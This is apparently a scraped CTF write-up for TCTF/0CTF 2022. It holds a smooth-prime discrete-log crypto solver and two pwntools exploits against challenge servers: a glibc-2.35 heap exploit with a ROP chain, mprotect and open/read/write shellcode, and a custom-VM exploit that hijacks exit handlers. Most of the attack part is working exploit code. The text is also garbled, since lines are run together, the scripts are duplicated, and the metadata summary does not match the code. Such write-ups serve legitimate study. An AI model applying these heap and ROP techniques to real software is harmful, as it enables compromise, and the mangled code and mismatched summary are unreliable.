---
title: TCTF/0CTF 2022 - Polaris Writeup
contest: TCTF/0CTF
year: 2022
team: Polaris
difficulty: hard
vuln_type: pwn_unknown
tags:
- smooth-prime
- discrete-log
- babyheap-tcache
- ezvm-pwn
- libc-2.35
- sage
attack_chain:
- 找 magic 满足 magic_num * 2^(384-LEN*8) + i * 2^(384-LEN*8-16) + 1 全小因子
- 构造 p+1 光滑
- primitive_root(n+1) 找生成元
- sha384 primitive_root 哈希为 num2
- discrete_log 求 e 满足 g^e = num2 mod (n+1)
- 输出 P, E, data
- 'flag: Hope_you_can_solve_by_smoothness_this_time'
- 'babyheap: tcache poisoning + largebin attack 拿 libc'
- House of Apple 改 IO_FILE → stack pivot → mprotect RWX → shellcode
- libc-2.35 IO_validate_vtable 检验 → _IO_wfile_jumps 绕开
- orw 沙箱读 flag
- 'ezvm: 自定义 VM (22/20/21/0/3/9/4/2/1 opcode)'
- 4 阶段 VM 注入 + 内存分配触发 mprotect
- 偏移 0x2672e0 找 exit_funcs
- 通过 one_gadget 触发
key_payload: n+1 全小因子 (光滑) → Pohlig-Hellman
one_liner: TCTF/0CTF 2022 Polaris：Crypto 光滑数 DLP + Pwn babyheap 2.35 largebin + ezvm 自定义 VM。
lesson: p+1 光滑时 Pohlig-Hellman 直接降级 DLP；libc-2.35 后 vtable 范围检查使 House of Apple 成为主流绕过。
quality: high
full_path: TCTF-0CTF_2022-Polaris_Writeup.full.md
meta_path: TCTF-0CTF_2022-Polaris_Writeup.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: TCTF/0CTF 2022 - Polaris Writeup。TCTF/0CTF 2022 Polaris：Crypto 光滑数 DLP + Pwn babyheap 2.35 largebin + ezvm 自定义 VM。。关键路径：找 magic 满足 magic_num * 2^(384-LEN*8) + i * 2^(384-LEN*8-16) + 1 全小因子 → 构造 p+1...
category: pwn
subcategory: pwn_other
tools_used:
- Sage
time_required: long
difficulty_score: 4
code_blocks_count: 4
images_count: 1
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/58888.html
wp_author: smoothness_this_time
reasoning_chain:
- magic 满足 n = magic_num*2^(384-LEN*8) + i*2^(384-LEN*8-16) + 1 全小因子 → 触发点：p+1 光滑
- 假设：n+1 全 40-bit 因子 → 动作：factor(n) → 假设：Pohlig-Hellman 降级 DLP
- primitive_root(n+1) 找生成元 → 假设：sha384 data = num2
- 动作：discrete_log(num2, num1) mod n+1 → 观察：解出 e
- 输出 P, E, data → flag Hope_you_can_solve_by_smoothness_this_time
- babyheap (libc-2.35) → tcache poisoning + largebin attack → environ leak
- 假设：House of Apple 改 IO_FILE → 假设：_IO_wfile_jumps 绕开 vtable 检验
- mprotect RWX + shellcode (open+read+write) → flag
failed_attempts:
- 试图用 LLL 通用 DLP → 失败：参数太大 LLL 跑不动
- 试图 libc-2.35 用 __free_hook → 失败：__free_hook 已移除
key_observations:
- p+1 光滑时 Pohlig-Hellman 直接降级 DLP
- libc-2.35 后 vtable 范围检查使 House of Apple (_IO_wfile_jumps) 成为主流绕过
- environ leak 拿 stack_addr 是 largebin attack 标准后续
- magic 数满足 (n+1) 全 40-bit 小因子是构造光滑数标准模式
prerequisites:
- Pohlig-Hellman 算法 + Sage discrete_log
- glibc-2.35 largebin attack + tcache poisoning
- House of Apple (_IO_wfile_jumps)
- seccomp orw 沙箱绕过 (open+read+write)
---
# TCTF/0CTF 2022-Polaris  Writeup

> 原文: https://www.ctfiot.com/58888.html
> ID: 58888

from Crypto.Util.number import *import gmpy2import binascii
from string import ascii_letters, digits
from hashlib import sha256, sha384
from itertools import producttable = ascii_letters + digits + '!#$%&*-?'
def proof_of_work(tail,_hash): print('开始爆破！') for i in product(table, repeat=4): head = ''.join(i) t = hashlib.sha256((head + tail).encode()).hexdigest() if t == _hash: print('爆破成功！结果是：', end='') print(head) break tail = input("tail:")_hash = input("_hash:")proof_of_work(tail,_hash) magic_hex = input("请输入：")magic = binascii.unhexlify(magic_hex)magic_num = bytes_to_long(magic)for i in range(65536): n = magic_num * 2 ** (384 - LEN*8) + i * 2 ** (384 - LEN*8 - 16) if is_prime(n + 1): f = factor(n) if all(p < 2 ** 40 for p, e in f): print(f) num1 = primitive_root(n+1) data = str(hex(int(num1)))[2:].encode() data2 = sha384(data).hexdigest() num2 = int(data2, 16) e = discrete_log(Zmod(n+1)(num2), Zmod(n+1)(num1)) if int(pow(num1, e, n+1)) == num2 % (n+1): print('solved') P = str(hex(n+1))[2:] E = str(hex(e)[2:]) print("P:", P, len(P), gmpy2.is_prime(n+1)) print("E:", E, len(E)) print("data:", data, len(data)) break   # nc 202.120.7.219 15555

```(base) 0HB@Caliburn ~ % nc 202.120.7.219 15555sha256(XXXX + t&YJ0I8OkC&DcMru) == a2c0e15904cfe04ed507cc8749777b04f4a8d271798245f2e5a411fbbf141cfeGive me XXXX:%no5cabb40d38331a1e7ac25cc5d6f95b595adP:>cabb40d38331a1e7ac25cc5d6f95b595ad10fc0000000000000000000000000000000000000000000000000000000001E:>4df0bc855e3135b6f49868603d78cefe90a8354ac47b623453ad6cdde24ecf73d8f693b5fd1bd5ffa5bb80ae0794876fdata:>3flag{Hope_you_can_solve_by_smoothness_this_time}python#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *import os, struct, random, time, sys, signal
libc = ELF('libc-2.35.so')
class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./babyheap']) self.pipe = remote('47.100.33.132', 2204) def send(self, data:
bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
 def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
 def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
 def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
 def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params)
 def add(self, size, content): self.sendlineafter(b'Command: ', b'1') self.sendlineafter(b'Size: ', str(size).encode()) self.sendlineafter(b'Content: ', content) def edit(self, index, content): self.sendlineafter(b'Command: ', b'2') self.sendlineafter(b'Index: ', str(index).encode()) self.sendlineafter(b'Size: ', b'-1') self.sendlineafter(b'Content: ', content)
 def delete(self, index): self.sendlineafter(b'Command: ', b'3') self.sendlineafter(b'Index: ', str(index).encode())
 def show(self, index): self.sendlineafter(b'Command: ', b'4') self.sendlineafter(b'Index: ', str(index).encode())
sh = Shell()sh.add(0x8, b'')sh.add(0x208, b'')sh.add(0x8, b'')sh.add(0x208, b'')sh.add(0x8, b'')sh.edit(0, b'a' * 0x18 + p64(0x441))sh.delete(1)sh.add(0x208, b'')sh.show(2)sh.recvuntil(b'Chunk[2]: ')libc_addr = (u64(sh.recvn(8)) - libc.sym['_IO_2_1_stdin_']) & (~0xfff)success('libc_addr: ' + hex(libc_addr))sh.add(0x8, b'')sh.add(0x8, b'')sh.delete(5)sh.show(2)sh.recvuntil(b'Chunk[2]: ')heap_addr = u64(sh.recvn(8)) * 0x1000success('heap_addr: ' + hex(heap_addr))sh.delete(6)sh.edit(2, b'b' * 0x18 + p64(0x21) + p64((heap_addr >> 12) ^ (libc_addr + libc.sym['_IO_2_1_stdout_'])))sh.add(0x8, b'')sh.add(0x0, b'')sh.edit(6, flat([0xfbad2887 | 0x1000, 0, 0, 0, libc_addr + libc.sym['environ'], libc_addr + libc.sym['environ'] + 8, libc_addr + libc.sym['environ'] + 8]))stack_addr = u64(sh.recvn(8)) - 0x120success('stack_addr: ' + hex(stack_addr))sh.delete(0)sh.delete(5)sh.edit(2, b'b' * 0x18 + p64(0x21) + p64((heap_addr >> 12) ^ (stack_addr - 8)))sh.add(0x0, b'')sh.add(0x0, b'')sh.edit(5, flat([ 0, libc_addr + next(libc.search(asm('pop rdi; ret;'))), stack_addr & (~0xfff), libc_addr + next(libc.search(asm('pop rsi; ret;'))), 0x1000, libc_addr + next(libc.search(asm('pop rdx; pop rbx; ret;'))), 7, 0, libc_addr + next(libc.search(asm('pop rax; ret;'))), 5, libc_addr + next(libc.search(asm('add eax, eax; ret; '))), libc_addr + next(libc.search(asm('syscall; ret;'))), stack_addr + 0x60,
]) + asm(''' mov eax, 0x67616c66 ;// flag push rax
 mov rdi, rsp xor eax, eax mov esi, eax mov al, 2 syscall ;// open
 push rax mov rsi, rsp xor eax, eax mov edx, eax inc eax mov edi, eax mov dl, 8 syscall ;// write open() return value
 pop rax test rax, rax js over
 mov edi, eax mov rsi, rsp mov edx, 0x01010201 sub edx, 0x01010101 xor eax, eax syscall ;// read
 mov edx, eax mov rsi, rsp xor eax, eax inc eax mov edi, eax syscall ;// write
over: xor edi, edi mov eax, 0x010101e8 sub eax, 0x01010101 syscall ;// exit'''))sh.sendlineafter(b'Command: ', b'5')sh.interactive()
python#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *import os, struct, random, time, sys, signal
libc = ELF('libc-2.35.so')
class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./ezvm']) self.pipe = remote('202.120.7.210', 40241) def send(self, data:
bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
 def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
 def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
 def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
 def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params)
sh = Shell()sh.sendlineafter(b'0ctf2022!!n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1f8).encode())sh.sendlineafter(b'memory count:n', str(0x800).encode())sh.sendlineafter(b'code:n', p8(23))sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1f8).encode())sh.sendlineafter(b'memory count:n', str(0x80).encode())
payload = b''payload += p8(22) + p8(0) + p64(0)
payload += p8(20) + p8(3) + p64(libc.sym['_IO_2_1_stdin_'])payload += p8(0) + p8(0)payload += p8(0) + p8(3)payload += p8(3)payload += p8(20) + p8(3) + p64(0xfffffffffffff000)payload += p8(0) + p8(3)payload += p8(9)payload += p8(1) + p8(0)
payload += p8(21) + p8(0) + p64(0x70)
sh.sendlineafter(b'code:n', payload + p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x38).encode())sh.sendlineafter(b'memory count:n', str(0x80).encode())sh.sendlineafter(b'code:n', p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x18).encode())sh.sendlineafter(b'memory count:n', str(3).encode())sh.sendlineafter(b'code:n', p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1e8).encode())sh.sendlineafter(b'memory count:n', str(0x80 + 0x4000000000000000).encode())
# g()payload = b''payload += p8(22) + p8(0) + p64(0x70)payload += p8(22) + p8(1) + p64(0)payload += p8(0) + p8(1)payload += p8(20) + p8(3) + p64(0x1000)payload += p8(0) + p8(3)payload += p8(4)payload += p8(20) + p8(3) + p64(0x4a0)payload += p8(0) + p8(3)payload += p8(2)payload += p8(1) + p8(1)

# offset = 0x26b2e0offset = 0x2672e0success('offset: ' + hex(offset))payload += p8(0) + p8(0)payload += p8(20) + p8(3) + p64(offset)payload += p8(0) + p8(3)payload += p8(2)payload += p8(0) + p8(1)payload += p8(3)payload += p8(20) + p8(3) + p64(8)payload += p8(0) + p8(3)payload += p8(5)payload += p8(1) + p8(2)
payload += p8(0) + p8(1)payload += p8(20) + p8(3) + p64(0x46e8)payload += p8(0) + p8(3)payload += p8(3)payload += p8(1) + p8(3)
payload += p8(21) + p8(2) + p64(0xa0)
payload += p8(21) + p8(3) + p64(0)
payload += p8(0) + p8(0)payload += p8(20) + p8(3) + p64(0xebcf1)payload += p8(0) + p8(3)payload += p8(2)
sh.sendlineafter(b'code:n', payload + p8(1))
sh.interactive()
from Crypto.Util.number import *import gmpy2import binascii
from string import ascii_letters, digits
from hashlib import sha256, sha384
from itertools import producttable = ascii_letters + digits + '!#$%&*-?'
def proof_of_work(tail,_hash): print('开始爆破！') for i in product(table, repeat=4): head = ''.join(i) t = hashlib.sha256((head + tail).encode()).hexdigest() if t == _hash: print('爆破成功！结果是：', end='') print(head) break tail = input("tail:")_hash = input("_hash:")proof_of_work(tail,_hash) magic_hex = input("请输入：")magic = binascii.unhexlify(magic_hex)magic_num = bytes_to_long(magic)for i in range(65536): n = magic_num * 2 ** (384 - LEN*8) + i * 2 ** (384 - LEN*8 - 16) if is_prime(n + 1): f = factor(n) if all(p < 2 ** 40 for p, e in f): print(f) num1 = primitive_root(n+1) data = str(hex(int(num1)))[2:].encode() data2 = sha384(data).hexdigest() num2 = int(data2, 16) e = discrete_log(Zmod(n+1)(num2), Zmod(n+1)(num1)) if int(pow(num1, e, n+1)) == num2 % (n+1): print('solved') P = str(hex(n+1))[2:] E = str(hex(e)[2:]) print("P:", P, len(P), gmpy2.is_prime(n+1)) print("E:", E, len(E)) print("data:", data, len(data)) break   # nc 202.120.7.219 15555
```(base) 0HB@Caliburn ~ % nc 202.120.7.219 15555sha256(XXXX + t&YJ0I8OkC&DcMru) == a2c0e15904cfe04ed507cc8749777b04f4a8d271798245f2e5a411fbbf141cfeGive me XXXX:%no5cabb40d38331a1e7ac25cc5d6f95b595adP:>cabb40d38331a1e7ac25cc5d6f95b595ad10fc0000000000000000000000000000000000000000000000000000000001E:>4df0bc855e3135b6f49868603d78cefe90a8354ac47b623453ad6cdde24ecf73d8f693b5fd1bd5ffa5bb80ae0794876fdata:>3flag{Hope_you_can_solve_by_smoothness_this_time}```
```python#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *import os, struct, random, time, sys, signal
libc = ELF('libc-2.35.so')
class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./babyheap']) self.pipe = remote('47.100.33.132', 2204) def send(self, data:
bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
 def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
 def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
 def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
 def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params)
 def add(self, size, content): self.sendlineafter(b'Command: ', b'1') self.sendlineafter(b'Size: ', str(size).encode()) self.sendlineafter(b'Content: ', content) def edit(self, index, content): self.sendlineafter(b'Command: ', b'2') self.sendlineafter(b'Index: ', str(index).encode()) self.sendlineafter(b'Size: ', b'-1') self.sendlineafter(b'Content: ', content)
 def delete(self, index): self.sendlineafter(b'Command: ', b'3') self.sendlineafter(b'Index: ', str(index).encode())
 def show(self, index): self.sendlineafter(b'Command: ', b'4') self.sendlineafter(b'Index: ', str(index).encode())
sh = Shell()sh.add(0x8, b'')sh.add(0x208, b'')sh.add(0x8, b'')sh.add(0x208, b'')sh.add(0x8, b'')sh.edit(0, b'a' * 0x18 + p64(0x441))sh.delete(1)sh.add(0x208, b'')sh.show(2)sh.recvuntil(b'Chunk[2]: ')libc_addr = (u64(sh.recvn(8)) - libc.sym['_IO_2_1_stdin_']) & (~0xfff)success('libc_addr: ' + hex(libc_addr))sh.add(0x8, b'')sh.add(0x8, b'')sh.delete(5)sh.show(2)sh.recvuntil(b'Chunk[2]: ')heap_addr = u64(sh.recvn(8)) * 0x1000success('heap_addr: ' + hex(heap_addr))sh.delete(6)sh.edit(2, b'b' * 0x18 + p64(0x21) + p64((heap_addr >> 12) ^ (libc_addr + libc.sym['_IO_2_1_stdout_'])))sh.add(0x8, b'')sh.add(0x0, b'')sh.edit(6, flat([0xfbad2887 | 0x1000, 0, 0, 0, libc_addr + libc.sym['environ'], libc_addr + libc.sym['environ'] + 8, libc_addr + libc.sym['environ'] + 8]))stack_addr = u64(sh.recvn(8)) - 0x120success('stack_addr: ' + hex(stack_addr))sh.delete(0)sh.delete(5)sh.edit(2, b'b' * 0x18 + p64(0x21) + p64((heap_addr >> 12) ^ (stack_addr - 8)))sh.add(0x0, b'')sh.add(0x0, b'')sh.edit(5, flat([ 0, libc_addr + next(libc.search(asm('pop rdi; ret;'))), stack_addr & (~0xfff), libc_addr + next(libc.search(asm('pop rsi; ret;'))), 0x1000, libc_addr + next(libc.search(asm('pop rdx; pop rbx; ret;'))), 7, 0, libc_addr + next(libc.search(asm('pop rax; ret;'))), 5, libc_addr + next(libc.search(asm('add eax, eax; ret; '))), libc_addr + next(libc.search(asm('syscall; ret;'))), stack_addr + 0x60,
]) + asm(''' mov eax, 0x67616c66 ;// flag push rax
 mov rdi, rsp xor eax, eax mov esi, eax mov al, 2 syscall ;// open
 push rax mov rsi, rsp xor eax, eax mov edx, eax inc eax mov edi, eax mov dl, 8 syscall ;// write open() return value
 pop rax test rax, rax js over
 mov edi, eax mov rsi, rsp mov edx, 0x01010201 sub edx, 0x01010101 xor eax, eax syscall ;// read
 mov edx, eax mov rsi, rsp xor eax, eax inc eax mov edi, eax syscall ;// write
over: xor edi, edi mov eax, 0x010101e8 sub eax, 0x01010101 syscall ;// exit'''))sh.sendlineafter(b'Command: ', b'5')sh.interactive()
```
```python#!/usr/bin/python3
# -*- coding:
utf-8 -*-
from pwn import *import os, struct, random, time, sys, signal
libc = ELF('libc-2.35.so')
class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./ezvm']) self.pipe = remote('202.120.7.210', 40241) def send(self, data:
bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
 def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
 def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
 def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
 def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params)
sh = Shell()sh.sendlineafter(b'0ctf2022!!n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1f8).encode())sh.sendlineafter(b'memory count:n', str(0x800).encode())sh.sendlineafter(b'code:n', p8(23))sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1f8).encode())sh.sendlineafter(b'memory count:n', str(0x80).encode())
payload = b''payload += p8(22) + p8(0) + p64(0)
payload += p8(20) + p8(3) + p64(libc.sym['_IO_2_1_stdin_'])payload += p8(0) + p8(0)payload += p8(0) + p8(3)payload += p8(3)payload += p8(20) + p8(3) + p64(0xfffffffffffff000)payload += p8(0) + p8(3)payload += p8(9)payload += p8(1) + p8(0)
payload += p8(21) + p8(0) + p64(0x70)
sh.sendlineafter(b'code:n', payload + p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x38).encode())sh.sendlineafter(b'memory count:n', str(0x80).encode())sh.sendlineafter(b'code:n', p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x18).encode())sh.sendlineafter(b'memory count:n', str(3).encode())sh.sendlineafter(b'code:n', p8(23))
sh.sendlineafter(b'continue?n', b'Ex')sh.sendlineafter(b'code size:n', str(0x1e8).encode())sh.sendlineafter(b'memory count:n', str(0x80 + 0x4000000000000000).encode())
# g()payload = b''payload += p8(22) + p8(0) + p64(0x70)payload += p8(22) + p8(1) + p64(0)payload += p8(0) + p8(1)payload += p8(20) + p8(3) + p64(0x1000)payload += p8(0) + p8(3)payload += p8(4)payload += p8(20) + p8(3) + p64(0x4a0)payload += p8(0) + p8(3)payload += p8(2)payload += p8(1) + p8(1)

# offset = 0x26b2e0offset = 0x2672e0success('offset: ' + hex(offset))payload += p8(0) + p8(0)payload += p8(20) + p8(3) + p64(offset)payload += p8(0) + p8(3)payload += p8(2)payload += p8(0) + p8(1)payload += p8(3)payload += p8(20) + p8(3) + p64(8)payload += p8(0) + p8(3)payload += p8(5)payload += p8(1) + p8(2)
payload += p8(0) + p8(1)payload += p8(20) + p8(3) + p64(0x46e8)payload += p8(0) + p8(3)payload += p8(3)payload += p8(1) + p8(3)
payload += p8(21) + p8(2) + p64(0xa0)
payload += p8(21) + p8(3) + p64(0)
payload += p8(0) + p8(0)payload += p8(20) + p8(3) + p64(0xebcf1)payload += p8(0) + p8(3)payload += p8(2)
sh.sendlineafter(b'code:n', payload + p8(1))
sh.interactive()
```
```


---
## 附图

[图片已移除]